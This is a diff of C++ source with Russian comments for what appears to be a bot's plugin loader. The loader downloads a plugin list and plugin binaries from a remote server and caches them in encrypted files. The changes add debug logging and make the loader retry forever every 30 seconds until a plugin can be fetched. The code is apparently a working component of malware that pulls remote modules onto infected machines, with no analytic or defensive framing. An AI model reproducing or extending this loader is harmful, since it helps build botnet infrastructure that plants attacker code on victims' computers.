@@ -12,7 +12,7 @@
 
 // Создаём средства для вывода отладочной инфлормации
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 namespace PLGDEBUGTEMPLATES
 {
@@ -147,19 +147,23 @@ namespace PLGLoader
 
 
 		// Запускаем цик загрузки списка плагинов
-        PDBG("Plugins", "Загружаем список плагинов");
+        PDBG("Plugins", "Загружаем список плагинов\r\n");
 		PCHAR Buf = NULL;
 		do
 		{
+			PDBG("Plugins", "try to DownloadPluginList('%s')\r\n", URL);
 			Buf = Plugin::DownloadPluginList(URL);
 			if (Buf != NULL)
 			{
 				// Записываем буффер в файл
-				PDBG("Plugins", "Список плагинов загружен");
+				PDBG("Plugins", "Список плагинов загружен\r\n");
                 DoWriteBufferToFile(File, Buf, Host);
 			}
 			else
-				pSleep(60000);
+			{
+				PDBG("Plugins", "DownloadPluginList failed. Sleeping 30 sec...\r\n");
+				pSleep(30 * 1000);
+			}
 		}
 		while (Buf == NULL);
 				
@@ -292,7 +296,7 @@ PCHAR Plugin::GetURL(PCHAR Name, PCHAR PluginsListURL, bool UpdateList)
 	if (STR::IsEmpty(Name))
 		return NULL;
 
-	PDBG("Plugins", "Получаем адрес плагина [%s]", Name);
+	PDBG("Plugins", "Получаем адрес плагина [%s]\r\n", Name);
 
 	// Получаем адрес загрузки
 	bool FreeURL = false;
@@ -307,7 +311,7 @@ PCHAR Plugin::GetURL(PCHAR Name, PCHAR PluginsListURL, bool UpdateList)
 	}
 	else
 	{
-		PDBG("Plugins", "Не удалось получить адрес списка плагинов!");
+		PDBG("Plugins", "Не удалось получить адрес списка плагинов!\r\n");
 		return NULL;
     }
 
@@ -362,11 +366,11 @@ PCHAR Plugin::GetURL(PCHAR Name, PCHAR PluginsListURL, bool UpdateList)
 
 	//Этап третий: Собираем ссылку
 	PCHAR FullURL = NULL;
-	File::WriteBufferA( "c:\\plg.txt", Buf, STR::Length(Buf) );
+	//File::WriteBufferA( "c:\\plg.txt", Buf, STR::Length(Buf) );
 	PCHAR URLFileName = PLGLoader::ExtractPluginURL(Name, Buf);
 	if (URLFileName != NULL)
 	{
-		PDBG("Plugins", "Путь к плагину: [%s]", URLFileName);
+		PDBG("Plugins", "Путь к плагину: [%s]\r\n", URLFileName);
 		FullURL = STR::New(5, ProtocolHTTP, HTTPProtocolDelimeter, URLRec.Host, "/", URLFileName );
 		STR::Free(URLFileName);
 	}
@@ -377,7 +381,7 @@ PCHAR Plugin::GetURL(PCHAR Name, PCHAR PluginsListURL, bool UpdateList)
 	ClearURL(&URLRec);
 
 	if (FullURL != NULL)
-	    PDBG("Plugins", "Адрес плагина: [%s]", FullURL);
+	    PDBG("Plugins", "Адрес плагина: [%s]\r\n", FullURL);
 
 	return FullURL;
 }
@@ -425,7 +429,7 @@ PCHAR Plugin::DownloadPluginList(PCHAR URL)
     HTTPResponse::Clear(&Response);
 
 
-//    PDBG("Plugins", "Содержимое загруженного списка плагинов: \r\n: [%s]", Result);
+    PDBG("Plugins", "Содержимое загруженного списка плагинов: \r\n: [%s]", Result);
 
 	return Result;
 }
@@ -439,7 +443,7 @@ LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileS
 
 	if (FileSize != NULL)
 		*FileSize = 0;
-	PDBG("Plugins", "Загружаем файл плагина [%s]", PluginName);
+	PDBG("Plugins", "Загружаем файл плагина [%s]\r\n", PluginName);
 
 	// Запускаем цикл загрузки плагина
 	bool UpdateList = false;
@@ -455,8 +459,9 @@ LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileS
 		if (URL == NULL)
 		{
 			// На сервере отсутствует запрашиваемый плагин
-			PDBG("Plugins", "Плагин [%s] отсутствует на сервере", PluginName);
-			return NULL;
+			PDBG("Plugins", "Плагин [%s] отсутствует на сервере. Спим 30 сек и пробуем еще.\r\n", PluginName);
+			pSleep(30 * 1000);
+			continue;
 		}
 
 		// В случае не первого обновления списка, перед очередной попыткой
@@ -503,7 +508,7 @@ LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileS
 		{
 			if (Response.Code == HTTP_CODE_OK)
 			{
-				PDBG("Plugins", "Плагин [%s] успешно загружен", PluginName);
+				PDBG("Plugins", "Плагин [%s] успешно загружен\r\n", PluginName);
 				// Копируем файл
 				DWORD Size = STR::Length(Document);
 				Module = (LPBYTE)MemAlloc(Size);
@@ -594,6 +599,7 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 	if (UseCache)
 		CacheFileName = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);
 
+	PDBG("Plugins", "DownloadEx: GetPluginCacheFileName() CacheFileName='%s'\r\n", CacheFileName);
 
 	DWORD BufSize = 0;
 	LPBYTE Buffer = NULL;
@@ -601,15 +607,23 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 	// Проверяем наличие файла в кэше
 	if (CacheFileName != NULL)
 	{
+		PDBG("Plugins", "DownloadEx: try ReadToBuffer() CacheFileName='%s'\r\n", CacheFileName);
+		
 		Buffer = (LPBYTE)CryptFile::ReadToBuffer(CacheFileName, &BufSize, NULL);
-    }
+		
+		PDBG("Plugins", "DownloadEx: ReadToBuffer() Buffer=0x%X\r\n", Buffer);
+	}
 
 	// Если не удалось прочитать файл из кэша ио загружаем файл плагина
 	bool Downloaded = false;
 	if (Buffer == NULL)
 	{
+		PDBG("Plugins", "DownloadEx: try DownloadFile() CacheFileName='%s'\r\n", CacheFileName);
+
 		Buffer = DownloadFile(PluginName, PluginListURL, &BufSize);
 		Downloaded = true;
+	
+		PDBG("Plugins", "DownloadEx: DownloadFile() result 0x%X\r\n", Buffer);
     }
 
 	if (Buffer == NULL)
